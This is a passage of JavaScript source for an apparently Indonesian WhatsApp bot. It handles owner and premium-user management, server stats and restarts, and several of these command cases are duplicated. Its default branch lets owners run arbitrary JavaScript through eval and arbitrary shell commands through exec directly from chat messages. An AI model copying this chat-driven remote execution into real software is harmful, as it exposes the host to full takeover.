    if (!q) return xreply(`Example: ${prefix + command} 628xxx`);
    let jid = toJid(q); 
    if (owner.includes(jid)) return xreply("Nomor sudah menjadi owner");
    owner.push(jid);
    fs.writeFileSync('./database/owner.json', JSON.stringify(owner, null, 2));
    xreply(`Berhasil menambah owner: ${jid}`);
}
break;

case 'delowner':
case 'delown': {
    if (!isOwner) return xreply("Only owner");
    if (!q) return xreply(`Example: ${prefix + command} 628xxx`);
    let jid = toJid(q);
    if (!owner.includes(jid)) return xreply("Nomor tersebut bukan owner");
    let index = owner.indexOf(jid);
    owner.splice(index, 1);
    fs.writeFileSync('./database/owner.json', JSON.stringify(owner, null, 2));
    xreply(`Berhasil menghapus owner: ${jid}`);
}
break;

// ===================== CASE: Premium Management =====================
case 'addpremium': 
case 'addprem': {
    if (!isOwner) return xreply(`Hanya owner yang bisa menggunakan perintah ini!`);
    if (!q) return xreply(`Penggunaan: ${prefix + command} 62xxx`);
    let jid = toJid(q);
    if (premium.includes(jid)) return xreply("Sudah premium");
    premium.push(jid);
    fs.writeFileSync('./database/premium.json', JSON.stringify(premium, null, 2));
    xreply(`Pengguna ${jid} berhasil ditambahkan ke Premium!`);
}
break;

case 'delpremium': 
case 'delprem': {
    if (!isOwner) return xreply(`Hanya owner yang bisa menggunakan perintah ini!`);
    if (!q) return xreply(`Penggunaan: ${prefix + command} 62xxx`);
    let jid = toJid(q);
    if (!premium.includes(jid)) return xreply("Nomor tersebut tidak ada di daftar premium");
    let indexPremium = premium.indexOf(jid);
    premium.splice(indexPremium, 1);
    fs.writeFileSync('./database/premium.json', JSON.stringify(premium, null, 2));
    xreply(`Pengguna ${jid} berhasil dihapus dari Premium!`);
}
break;

case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    paw.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted:m})
}
break;       
			
			case "public": {
				if (!isOwner) return
				m.reply("succes change status to public")
				paw.public = true
			}
			break

			case "self": {
				if (!isOwner) return
				m.reply("succes change status to self")
				paw.public = false
			}
			break
			
			case 'restartbot': {
    if (!isOwner) return xreply("No Access");
    const msg = await restartPanelServer();
    await xreply(msg);
}
break;


// ===================== OWNER ===================== //
case 'addowner':
case 'addown': {
    if (!isOwner) return xreply("Only owner")
    if (!q) return xreply(`Example: ${prefix + command} 628xxx`)

    let jid = toJid(q)

    if (owner.includes(jid)) {
        return xreply("User sudah menjadi owner")
    }

    owner.push(jid)

    fs.writeFileSync(
        './database/owner.json',
        JSON.stringify(owner, null, 2)
    )

    xreply(`Berhasil menambahkan owner\n\nUser: ${jid}`)
}
break

case 'delowner':
case 'delown': {
    if (!isOwner) return xreply("Only owner")
    if (!q) return xreply(`Example: ${prefix + command} 628xxx`)

    let jid = toJid(q)

    if (!owner.includes(jid)) {
        return xreply("User tidak ada di database owner")
    }

    owner.splice(owner.indexOf(jid), 1)

    fs.writeFileSync(
        './database/owner.json',
        JSON.stringify(owner, null, 2)
    )

    xreply(`Berhasil menghapus owner\n\nUser: ${jid}`)
}
break

case 'listowner':
case 'listown': {
    if (!isOwner) return xreply("Only owner")

    if (owner.length < 1) {
        return xreply("Database owner kosong")
    }

    let teks = `*LIST OWNER*\n\n`

    for (let i of owner) {
        teks += `- @${i.split("@")[0]}\n`
    }

    paw.sendMessage(m.chat, {
        text: teks,
        mentions: owner
    }, {
        quoted: m
    })
}
break

// ===================== PREMIUM ===================== //
case 'addpremium':
case 'addprem': {
    if (!isOwner) return xreply("Only owner")
    if (!q) return xreply(`Example: ${prefix + command} 628xxx`)

    let jid = toJid(q)

    if (premium.includes(jid)) {
        return xreply("User sudah premium")
    }

    premium.push(jid)

    fs.writeFileSync(
        './database/premium.json',
        JSON.stringify(premium, null, 2)
    )

    xreply(`Berhasil menambahkan premium\n\nUser: ${jid}`)
}
break

case 'delpremium':
case 'delprem': {
    if (!isOwner) return xreply("Only owner")
    if (!q) return xreply(`Example: ${prefix + command} 628xxx`)

    let jid = toJid(q)

    if (!premium.includes(jid)) {
        return xreply("User tidak ada di database premium")
    }

    premium.splice(premium.indexOf(jid), 1)

    fs.writeFileSync(
        './database/premium.json',
        JSON.stringify(premium, null, 2)
    )

    xreply(`Berhasil menghapus premium\n\nUser: ${jid}`)
}
break

case 'listpremium':
case 'listprem': {
    if (!isOwner) return xreply("Only owner")

    if (premium.length < 1) {
        return xreply("Database premium kosong")
    }

    let teks = `*LIST PREMIUM*\n\n`

    for (let i of premium) {
        teks += `- @${i.split("@")[0]}\n`
    }

    paw.sendMessage(m.chat, {
        text: teks,
        mentions: premium
    }, {
        quoted: m
    })
}
break


			default:
			if (body.startsWith("<")) {
                if (!isOwner) return;
                try {
                    const output = await eval(`(async () => ${q})()`);
                    await m.reply(`${typeof output === 'string' ? output : JSON.stringify(output, null, 4)}`);
                } catch (e) {
                    await m.reply(`Error: ${String(e)}`);
                }
            }
			if (budy.startsWith(">")) {
			if (!isOwner) return
				try {
					let evaled = await eval(q);
					if (typeof evaled !== "string") evaled = util.inspect(evaled);
					await m.reply(evaled);
				} catch (e) {
					await m.reply(`Error: ${String(e)}`);
				}
			}
			if (budy.startsWith("$")) {
			if (!isOwner) return
				exec(q,
					(err, stdout) => {
						if (err) return m.reply(err.toString());
						if (stdout) return m.reply(stdout.toString());
				})
				}
		}
		
	} catch (e) {
		console.log(e)
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(`Update ${__filename}`)
	delete require.cache[file]
	require(file)
})
